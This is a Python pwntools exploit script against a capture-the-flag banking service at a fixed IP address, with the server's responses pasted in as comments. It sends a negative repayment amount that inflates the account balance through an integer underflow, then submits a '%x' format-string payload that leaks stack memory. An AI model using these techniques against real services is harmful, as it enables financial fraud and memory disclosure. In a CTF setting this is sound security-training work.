# -*- coding: cp949 -*-
from pwn import *
r = remote('112.166.114.144', 35122)
print r.recvuntil('[>]')
# 1. Yisf lotto
# 2. Yisf bank
# 3. explanation
# 4. EXIT
# [>]
r.sendline('2')
print r.recvuntil('[>]')
# Yisf Bank
# 1.  Loan
# 2.  Repayment
# 3.  Bank account
# 4.  Previous Screen
# [>]
r.sendline('2')
print r.recvuntil('[>]')
# [Before]
# your money: 10000won
# your loan money: 0won
# Hello ~ I came to pay the money back.
# [>]
r.sendline('-2100000000')
print r.recv()
print r.recv()
# [After]
# your money: 2100010000won
# your loan money: 2100000000won
r.sendline()
print r.recvuntil('[>]')
# Yisf Bank
# 1.  Loan
# 2.  Repayment
# 3.  Bank account
# 4.  Previous Screen
# [>]
r.sendline('3')
print r.recvuntil('[>]')
# 1. Opening an Account
# 2. Deposit
# 3. Withdraw
# 4. Delete
# 5. EXIT
# [>]
r.sendline('1')
print r.recvuntil(']') # [Name(7)]
r.sendline('asdf'*2)
print r.recvuntil(']') # [Password(4)]
r.sendline('1234')
print r.recvuntil(']') # [Member Number(1)]
r.sendline('1')
print r.recvuntil('Thank you~!')
#                                           __                __
#   ____  ____   ____    ________________ _/  |_  ______    _/  |_  ____       ___.__. ____  __ __
# _/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/    \   __\/  _ \     <   |  |/  _ \|  |  \
# \  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \      |  | (  <_> )     \___  (  <_> )  |  /
#  \___  >____/|___|  /\___  /|__|  (____  /__| /____  >     |__|  \____/      / ____|\____/|____/
#      \/           \//_____/            \/          \/                        \/
#
# Nice meet you~! asdfasd
# You are Password is 1234
# You are Membership Number is 1
# Thank you~!
r.sendline()
print r.recvuntil('[>]')
# 1. Opening an Account
# 2. Deposit
# 3. Withdraw
# 4. Delete
# 5. EXIT
# [>]
r.sendline('4')
print r.recvuntil('[>]')
# Please enter your password to delete your membership.
# [>]
r.sendline('1234')
print r.recvuntil('[>]')
# Oh~ I am sad
# See you again asdfasd
# Sign for deletion~
# [>]
r.sendline('%x '*16)
print r.recvuntil('Thank you~ bye')
# your sign is ffca9210 33323104 78250034 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 a2078 26d5ed00
# Delete Complete!
# Thank you~ bye
